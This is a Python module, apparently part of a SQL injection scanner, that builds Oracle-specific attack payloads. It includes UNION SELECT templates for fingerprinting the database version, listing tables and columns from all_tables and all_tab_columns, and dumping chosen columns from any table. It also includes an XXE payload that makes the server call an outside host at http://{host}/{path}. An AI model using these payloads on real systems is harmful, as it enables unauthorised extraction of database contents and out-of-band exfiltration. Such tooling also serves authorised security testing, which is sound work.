# app/modules/scanner/dbms/oracle/payloads.py

"""
Oracle-specific SQL injection payloads.
"""


class OraclePayloads:
    """Oracle-specific payload generation."""

    def __init__(self):
        """Initialize Oracle payloads."""
        self.payloads = {
            "detection": {
                "dual_check": "UNION SELECT NULL FROM dual",
                "version": "UNION SELECT banner FROM v$version",
                "error_based": "TO_NUMBER(TO_CHAR(DATE'2024-01-01','YYYY'))",
            },
            "enumeration": {
                "user_tables": "UNION SELECT table_name,NULL FROM user_tables",
                "all_tables": "UNION SELECT table_name,NULL FROM all_tables",
                "table_columns": "UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='{table}'",
                "user_columns": "UNION SELECT column_name,NULL FROM user_tab_columns WHERE table_name='{table}'",
                "table_count": "UNION SELECT COUNT(*),NULL FROM all_tables",
            },
            "extraction": {
                "dump_table": "UNION SELECT {col1},{col2} FROM {table}",
                "dump_with_where": "UNION SELECT {col1},{col2} FROM {table} WHERE {col3}='{value}'",
                "concat_columns": "UNION SELECT {col1}||':'||{col2},NULL FROM {table}",
            },
            "oracle_specific": {
                "rownum": "UNION SELECT table_name,NULL FROM all_tables WHERE ROWNUM <= {limit}",
                "dual_sequence": "UNION SELECT NULL FROM dual",
                "xml_extract": "UNION SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://{host}/{path}\">%remote;]>'),'/l') FROM dual",
            },
        }

    def get_payload(self, category: str, name: str, **kwargs) -> str:
        """
        Get a specific Oracle payload.

        Args:
            category: Payload category
            name: Payload name
            **kwargs: Format parameters

        Returns:
            str: Formatted payload
        """
        if category not in self.payloads:
            raise ValueError(f"Unknown category: {category}")

        if name not in self.payloads[category]:
            raise ValueError(f"Unknown payload: {name}")

        template = self.payloads[category][name]
        return template.format(**kwargs) if kwargs else template

    def generate_null_payload(self, count: int) -> str:
        """
        Generate a UNION SELECT NULL payload for Oracle.

        Args:
            count: Number of NULLs

        Returns:
            str: Payload string
        """
        nulls = ",".join(["NULL"] * count)
        return f"UNION SELECT {nulls} FROM dual"

    def generate_injection_payloads(self, column_count: int) -> list[str]:
        """
        Generate all injection payloads for a given column count.

        Args:
            column_count: Number of columns

        Returns:
            List[str]: List of payloads
        """
        base_payload = self.generate_null_payload(column_count)

        # Different variations
        payloads = [
            base_payload,
            base_payload.replace("SELECT ", "SELECT DISTINCT "),
            f"{base_payload}--",
            f"{base_payload}#",
            f"{base_payload}/*",
        ]

        return payloads

    def get_table_payloads(self, table_name: str, columns: list[str]) -> str:
        """
        Generate payload to extract data from a table.

        Args:
            table_name: Table name
            columns: Columns to extract

        Returns:
            str: Payload string
        """
        if len(columns) == 1:
            return f"UNION SELECT {columns[0]},NULL FROM {table_name}"
        elif len(columns) >= 2:
            return f"UNION SELECT {columns[0]},{columns[1]} FROM {table_name}"
        else:
            raise ValueError("At least one column required")
